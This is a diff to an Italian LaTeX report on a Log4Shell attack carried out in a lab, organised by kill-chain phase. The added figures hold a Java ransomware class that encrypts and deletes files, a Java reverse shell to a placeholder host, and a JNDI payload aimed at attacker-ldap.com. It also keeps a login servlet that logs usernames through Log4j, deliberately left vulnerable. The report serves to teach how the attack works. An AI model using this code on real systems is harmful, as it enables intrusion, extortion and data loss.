@@ -163,6 +163,13 @@ Un'attacco che sfrutta la vulnerabilità Log4Shell con il vettore LDAP per otten
     \item A questo punto l'applicazione vulnerabile carica il file remoto \verb!Exploit.class!, instanziando l'oggetto Java ed eseguendo il codice del suo costruttore. Tale operazione consente all'attaccante di ottenere i privilegi di esecuzione di codice remoto sull'host.
 \end{enumerate}
 
+\begin{figure}
+\centering
+\includegraphics[width=0.7\textwidth]{img/log4shell.png}
+\caption{Schema di un attacco mediante Log4Shell}
+\label{fig:log4shellschema}
+\end{figure}
+
 \newpage
 
 %% POC %%
@@ -193,16 +200,15 @@ L'operazione di scrittura del log mediante Log4j permette di triggerare la nota 
         protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
             String userName = req.getParameter("uname");
             String password = req.getParameter("password");
-    
             logger.info("User " + userName + " tried to log in");
     
             if (userName.equals("admin") && password.equals("password")) {
                 RequestDispatcher view = req.getRequestDispatcher("dashboard.jsp");
                 view.forward(req, resp);
             } else {
-                req.setAttribute("errors", true);
+                req.setAttribute("error", "Login failed: wrong user credentials");
                 RequestDispatcher view = req.getRequestDispatcher("index.jsp");
-                view.forward(req, resp);
+                view.include(req, resp);
             }
         }
     }
@@ -254,6 +260,52 @@ A tale scopo sono stati implementati i seguenti file:
     \item \verb!exploit.py!: avvia i servizi LDAP e HTTP sul server attaccante e genera il payload malevolo.
 \end{itemize}
 
+\begin{figure}
+    \centering
+    \begin{lstlisting}
+    public class Ransomware {
+        private final static SecretKey key = Ransomware.generateKey();
+        private final static String publicKey = "__public.key__";
+    
+        public Ransomware() throws Exception {
+            Ransomware.sendKey();
+            Ransomware.fireUp();
+            while (true) {
+                Ransomware.recover();
+            }
+        }
+    
+        private static void fireUp() {
+            File file = new File(baseDir);
+            File[] files = file.listFiles(new FilenameFilter() {
+                @Override
+                public boolean accept(File dir, String name) {
+                    return name.toLowerCase().endsWith(".txt");
+                }
+            });
+            for (File f : files) {
+                Ransomware.encryptRoutine(baseDir + f.getName());
+            }
+        }
+    
+        private static void encryptRoutine(String fileName) {
+            File inputFile = new File(fileName);
+            File encryptedFile = new File(fileName + ".encrypted");
+            try {
+                Ransomware.encrypt(inputFile, encryptedFile);
+                System.out.println(inputFile + " is encrypted now");
+                inputFile.delete();
+            } catch (Exception e) {
+                System.out.println(e.getMessage());
+                e.printStackTrace();
+            }
+        }
+    }
+\end{lstlisting}
+    \caption{Ransomware - Codice Java}
+    \label{fig:ransomware}
+\end{figure}
+
 \subsubsection{Delivery}
 In un attacco che sfrutta Log4j la fase di Delivery non è presente poiché la trasmissione e la seguente esecuzione del malware vengono effettuati durante l'exploit della vulnerabilità legata alla libreria di logging.
 
@@ -263,12 +315,19 @@ La fase principale dell'attacco viene attuata sfruttando la vulnerabilità di Lo
 Lo script \verb!exploit.py! presente nel progetto ha lo scopo di:
 \begin{itemize}
     \item Instanziare un server LDAP malevolo in ascolto sulla porta 1389.
-    \item Compilare la classe Java da eseguire sulla macchina vittima ed hostare il file \verb!.class ! su un server HTTP in ascolto sulla porta 8000.
+    \item Compilare la classe Java da eseguire sulla macchina vittima ed hostare il file \verb!.class! su un server HTTP in ascolto sulla porta 8000.
     \item Generare il payload malevolo per sfruttare la vulnerabilità, formattato come una stringa del tipo: 
     \begin{center}
         \verb!${jndi:ldap://attacker-ldap.com:1389/a}!
     \end{center}
 \end{itemize}
+
+\begin{figure}
+\centering
+\includegraphics[width=0.8\textwidth]{img/exploit.png}
+\caption{Script di exploit}
+\label{fig:exploit}
+\end{figure}
 
 L'attaccante invia al server web il payload generato inserendolo nel campo \verb!username! del form di login.
 Apache Log4j, al momento di loggare il nome utente, effettua una richiesta JNDI al server LDAP creato, il quale restituisce il path dell'oggetto Java con il codice malevolo.
@@ -281,6 +340,54 @@ L’obiettivo dell'attaccante è quello di mantenere l’accesso alla macchina (
 Tramite una ulteriore JNDI Injection si esegue il codice remoto di una classe Java che, collegandosi ad un server malevolo dell'attaccante, apre una reverse shell.
 Questo exploit permette di ottenere il totale controllo della macchina vittima e può essere usato come base per lanciare ulteriori attacchi.
 
+\begin{figure}
+    \centering
+    \begin{lstlisting}
+    public class ReverseShell {
+        public ReverseShell() throws Exception {
+            String host = "__ip__";
+            int port = Integer.parseInt("__port__");
+            String cmd = "/bin/sh";
+    
+            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+            Socket s = new Socket(host, port);
+            InputStream pi = p.getInputStream(),
+                    pe = p.getErrorStream(),
+                    si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+    
+            while (!s.isClosed()) {
+                while (pi.available() > 0) {
+                    so.write(pi.read());
+                }
+    
+                while (pe.available() > 0) {
+                    so.write(pe.read());
+                }
+    
+                while (si.available() > 0) {
+                    po.write(si.read());
+                }
+    
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+    
+                try {
+                    p.exitValue();
+                    break;
+                } catch (Exception e) {
+                }
+            }
+    
+            p.destroy();
+            s.close();
+        }
+    }
+\end{lstlisting}
+    \caption{Revershe Shell - Codice Java}
+    \label{fig:revshell}
+\end{figure}
 
 \subsubsection{Command and Control}
 In questa fase viene stabilito un canale di comunicazione con un server controllato dall’attaccante. 
